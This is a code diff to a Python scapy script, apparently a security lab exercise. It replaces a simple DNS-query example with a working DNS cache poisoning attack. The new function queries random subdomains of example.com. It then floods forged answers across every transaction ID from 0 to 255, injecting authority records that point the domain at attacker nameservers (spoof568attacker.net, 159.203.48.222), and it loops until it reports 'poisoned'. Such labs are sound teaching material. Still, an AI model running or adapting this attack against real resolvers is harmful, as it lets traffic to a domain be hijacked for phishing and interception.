@@ -35,26 +35,53 @@ def getRandomTXID():
     return randint(0, 256)
 
 
-'''
-Sends a UDP packet.
-'''
-def sendPacket(sock, packet, ip, port):
-    sock.sendto(str(packet), (ip, port))
+def send_dns_query():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    domain = getRandomSubDomain() + '.example.com.'
 
+    request = DNS(rd=1, qd=DNSQR(qname=domain))
+    sock.sendto(bytes(request), (my_ip, my_port))
 
-'''
-Example code that sends a DNS query using scapy.
-'''
-def exampleSendDNSQuery():
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
-    dnsPacket = DNS(rd=1, qd=DNSQR(qname='example.com'))
-    sendPacket(sock, dnsPacket, my_ip, my_port)
+    for i in range(0, 2 ** 8):
+        spoofed_response = DNS(id=i,
+                               aa=1,
+                               qr=1,
+                               qd=request.qd,
+                               an=(
+                                   DNSRR(rrname=request.qd.qname,
+                                         rdata="1.2.3.4",
+                                         ttl=11920,
+                                         type='A')
+                               ),
+                               ns=(
+                                   DNSRR(rrname="example.com.",
+                                         ttl=11920,
+                                         rdata="ns1.spoof568attacker.net.",
+                                         type='NS') /
+                                   DNSRR(rrname="example.com.",
+                                         ttl=11920,
+                                         rdata="ns2.spoof568attacker.net.",
+                                         type='NS')
+                               ),
+                               ar=(
+                                   DNSRR(rrname="ns1.spoof568attacker.net.",
+                                         ttl=11920,
+                                         rdata="159.203.48.222",
+                                         type='A') /
+                                   DNSRR(rrname="ns2.spoof568attacker.net.",
+                                         ttl=11920,
+                                         rdata="159.203.48.222",
+                                         type='A')
+                               ))
+        sock.sendto(bytes(spoofed_response), (my_ip, my_query_port))
+
     response = sock.recv(4096)
     response = DNS(response)
-    print "\n***** Packet Received from Remote Server *****"
-    print response.show()
-    print "***** End of Remote Server Packet *****\n"
+
+    return response.ancount == 1
 
 
 if __name__ == '__main__':
-    exampleSendDNSQuery()
+    while not send_dns_query():
+        pass
+    print('poisoned')
